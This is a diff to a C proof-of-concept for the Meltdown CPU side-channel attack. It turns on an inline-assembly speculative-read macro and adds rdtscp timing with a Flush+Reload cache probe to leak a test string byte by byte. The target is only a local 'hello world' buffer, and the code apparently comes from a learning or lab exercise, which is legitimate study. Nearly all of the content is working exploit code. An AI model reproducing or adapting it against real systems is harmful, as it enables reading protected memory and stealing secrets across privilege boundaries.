@@ -14,13 +14,15 @@
 #endif
 
 #define DEBUG 1
-#define RETRIES 1000
-#define THRESHOLD 90
+#define RETRIES 1
+#define THRESHOLD 250
 
-// Downside of this implementation, can't read 0 values 
+// Downside of this implementation, can't read 0 values
+
+// shift by 14 left since you want to mulitply the index by 4096 and sizeof(int)
 #define MELTDOWN(addr) \
   asm("1:\n movzx (%%rcx), %%rax\n" \
-      "shl $12, %%rax\n" \
+      "shl $14, %%rax\n" \
       "jz 1b\n" \
       "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
       :						\
@@ -39,16 +41,32 @@ static void flush(void *p) {
   asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
 }
 
+static inline uint64_t rdtscp() {
+  uint64_t a = 0, d = 0;
+  asm volatile("mfence");
+  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
+  a = (d << 32) | a;
+  asm volatile("mfence");
+  return a;
+
+}
+
 // measures access time, if hit return 1 else return 0;
 static inline int flush_reload(void *p) {
-  return 0;
+  // time access
+  register uint64_t start, elapsed; 
+  start = rdtscp();
+  maccess(p);
+  elapsed = rdtscp() - start;
+  flush(p);
+  return elapsed < THRESHOLD ? 1 : 0;
 }
 
 
 /*
   Global vars 
  */
-int * rec; 
+int* rec; 
 char secret[100] = "hello world\n";
 
 /*
@@ -56,45 +74,14 @@ char secret[100] = "hello world\n";
  */
 void init() {
   // setup recieving array
-  rec = (int *) malloc(sizeof(*rec) * 300 * 4096); // page stride
+  rec = (int *) malloc(300 * 4096 * sizeof(*rec)); // page stride
   rec = (int *) (((size_t)rec & ~0xfff) + 0x2000);
+  memset(rec, 0x00, 4096 * 270 * sizeof(*rec)); // THIS IS NECESSARY OR ELSE FLUSHES TO ONE ADDRESS FLUSH THE WHOLE STRUCTURE
   for(int i = 0; i < 256; i++) {
-    _mm_clflush(&rec[i * 4096]); //flush it from memory 
+    flush(&rec[i * 4096]); //flush it from memory 
   }
 
   INFO("Init finished\n");
-}
-
-
-/*
-  Read reciever bytes 
- */
-int __attribute__((always_inline)) read_byte_from_reciever() {
-  int junk = 0;
-  int min_value = 1000; //which ever one has the lowest time to access
-  int min_idx = -1;
-
-  // measure
-  for(int i = 0; i < 256; i++) {
-    int mix_i = ((i * 167) + 13) & 255;
-
-    // timing
-    int* addr = &rec[mix_i * 4096];
-    int start = __rdtscp(&junk);
-    maccess((void*)addr); 
-    int elapsed = __rdtscp(&junk) - start;
-
-    // flush it 
-    flush(addr);
-    
-    // check time 
-    if(elapsed < min_value) {
-      min_value = elapsed;
-      min_idx = mix_i;
-    }
-  }
-
-  return min_idx;
 }
 
 char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
@@ -106,21 +93,17 @@ char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
   for(int i = 0; i < size; i++) {
     // hit counter
     int hit[256];
-    for(int j = 0; j < 256; j++) hit[j] = 0; 
+    memset(hit, 0, sizeof(hit));
 
     // do RETRIES
     for(int j = 0; j < RETRIES; j++) {
       // meltdown attack into cache 
-      //MELTDOWN(addr);
-
-      volatile int* p = &rec[60 * 4096];
-      maccess((void*)p); 
-            
-      // recieve 
-      int value = read_byte_from_reciever(addr);
-
-      hit[value]++;
-      sched_yield();
+      MELTDOWN(addr);
+      
+      // flush + reload
+      for(int k = 0; k < 256; k++) {
+	if(flush_reload(rec + k*4096)) hit[k]++;
+      }
     }
     
     // find max
@@ -151,10 +134,20 @@ char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
 /*
   Main function
 */
-int main(void) {
+int main(void) {  
   // create reciever 
-  init();
+  init();  
 
+  /*
+  maccess(rec + 60*4096);
+  flush((rec + 60*4096));
+  int start = rdtscp();
+  maccess(rec + 60 * 4096);
+  int elapsed = rdtscp() - start; 
+  INFO("%d\n", elapsed);
+  return 0;
+  */
+  
   // attempt read
   char *guess = read_string(secret);
   ERROR("String is: %s\n", guess);
